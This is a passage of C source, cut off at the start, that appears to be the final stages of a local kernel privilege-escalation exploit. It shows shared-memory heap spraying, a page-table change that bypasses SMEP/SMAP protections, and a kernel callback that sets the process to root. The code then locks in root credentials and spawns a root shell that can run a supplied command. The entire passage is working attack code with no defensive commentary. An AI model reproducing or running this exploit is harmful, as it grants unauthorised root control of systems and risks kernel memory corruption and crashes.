			goto hang;
		}
		printf("[+] K=%d SIGSEGV: -1 reached imo+12 -> num=max=0xffff\n", hit);
	}

	/* --- Phase 5: close(target) -> PTE change -> shell callback -> loop-fix --- */
	printf("\n[*] Phase 5: close(target) -> PTE ...65->...63 -> if_ioctl shell\n");
	fflush(stdout);
	sync(); sync();
	{
		int rc = close(target);
		printf("[+] close(target) returned %d (errno=%d)  ★★★\n",
		    rc, errno);
	}
	if (geteuid() != 0) {
		volatile unsigned char b;
		struct sigaction sa;
		memset(&sa, 0, sizeof(sa));
		sa.sa_handler = probe_sigh;
		sigemptyset(&sa.sa_mask);
		sigaction(SIGSEGV, &sa, NULL);
		sigaction(SIGBUS, &sa, NULL);
		probe_sig = 0;
		if (sigsetjmp(probe_jb, 1) == 0) {
			b = *(volatile unsigned char *)(uintptr_t)shell_va;
			printf("[-] callback missed and shell is still user-readable "
			    "(%#x): PTE carrier missed\n", b);
		} else {
			printf("[-] callback missed but shell is supervisor-only: "
			    "PTE SMEP/SMAP bypass succeeded; ifnet target missed\n");
		}
		goto hang;
	}
	printf("[+] callback changed euid to 0 with SMEP/SMAP enabled\n");
	if (setresuid(0, 0, 0) == -1 || setresgid(0, 0, 0) == -1)
		err(1, "setresuid/setresgid after kernel callback");
	printf("[+] durable credentials: uid=%u euid=%u gid=%u egid=%u\n",
	    getuid(), geteuid(), getgid(), getegid());
	{
		pid_t rp = fork();
		int st;
		if (rp == -1)
			err(1, "fork root shell");
		if (rp == 0) {
			if (argc > 1)
				execl("/bin/sh", "sh", "-p", "-c", argv[1],
				    (char *)NULL);
			else
				execl("/bin/sh", "sh", "-p", (char *)NULL);
			_exit(127);
		}
		waitpid(rp, &st, 0);
		printf("[+] root shell command exited status=%#x\n", st);
	}

	/* The malicious leaf is no longer executing.  PROT_NONE removes its
	 * hardware PTE, after which the ordinary VM teardown can drop it. */
	if (mprotect((void *)(uintptr_t)shell_va, 2 * pgsz, PROT_NONE) == -1)
		err(1, "remove supervisor shell PTE");
	if (munmap((void *)(uintptr_t)shell_va, 2 * pgsz) == -1)
		err(1, "unmap former shell leaf");
	printf("[+] removed the supervisor executable mapping\n");

	/* No probe is in flight now.  shmdt consumes the UAO reference acquired
	 * by helper shmat, clears its shmmap record, and lets it exit normally. */
	hc.op = 2; hc.arg = 0;
	if (write(hcmd_pipe[1], &hc, sizeof(hc)) != sizeof(hc) ||
	    read(hrep_pipe[0], &hr, sizeof(hr)) != sizeof(hr))
		errx(1, "helper died during shmdt handshake");
	{
		int st;
		waitpid(helper_pid, &st, 0);
		printf("[+] helper shmdt(H_va)=%d errno=%u; exit status=%#x\n",
		    hr.outcome, hr.val, st);
		if (hr.outcome != 0 || st != 0)
			errx(1, "helper failed clean detach");
		helper_pid = -1;
	}

	/* The kernel recount donated exactly NEW's missing descriptor ref:
	 * refs are now SPRAY descriptor + recount_map + NEW descriptor.
	 * Consume each owner once and require both public ids to disappear. */
	if (shmctl(new_id, IPC_RMID, NULL) == -1)
		err(1, "IPC_RMID recounted NEW");
	if (shmdt(recount_map) == -1)
		err(1, "shmdt SPRAY recount mapping");
	if (shmctl(spray_id, IPC_RMID, NULL) == -1)
		err(1, "IPC_RMID SPRAY");
	errno = 0;
	if (shmctl(new_id, IPC_STAT, NULL) != -1 || errno != EINVAL)
		errx(1, "NEW still published after recount teardown");
	errno = 0;
	if (shmctl(spray_id, IPC_STAT, NULL) != -1 || errno != EINVAL)
		errx(1, "SPRAY still published after recount teardown");
	printf("[+] UAO recount balanced; NEW and SPRAY removed safely\n");
	printf("[+] proof process can exit without an aliased live UAO\n");
	return 0;

hang:
	printf("\n[!] Kernel heap state is corrupt.  DO NOT IPC_RMID SPRAY\n"
	    "[!] (0x%08x) or NEW (0x%08x).  Helper pid %d holds the\n"
	    "[!] size-confused map entry.  REBOOT NOW.\n",
	    spray_id, new_id, helper_pid);
	if (hold_wr >= 0)
		close(hold_wr);
	for (i = stale_used; i < nstale; i++)
		waitpid(stale[i], NULL, 0);
	printf("[*] parent hanging (Ctrl-C / reboot to end)\n");
	for (;;)
		pause();

cleanup_fail:
	kill(helper_pid, SIGKILL);
	waitpid(helper_pid, NULL, 0);
	if (hold_wr >= 0)
		close(hold_wr);
	for (i = stale_used; i < nstale; i++)
		waitpid(stale[i], NULL, 0);
	unlink(SCRATCH_FILE);
	return 1;
}
